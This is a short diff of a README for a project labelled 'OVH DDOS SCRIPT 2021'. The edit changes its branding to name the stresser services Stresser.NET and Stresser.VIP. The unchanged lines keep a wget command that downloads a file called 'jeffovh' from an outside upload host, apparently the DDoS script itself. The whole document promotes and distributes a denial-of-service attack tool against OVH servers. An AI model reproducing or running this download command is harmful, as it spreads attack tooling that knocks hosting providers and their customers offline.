@@ -1,5 +1,5 @@
 # OVH-DDOS-2021
-Stresser.NET // OVH DDOS SCRIPT 2021 
+Stresser.NET & Stresser.VIP  // OVH DDOS SCRIPT 2021 
 
 
 wget http://upload.vina-host.com/10yiIS/jeffovh
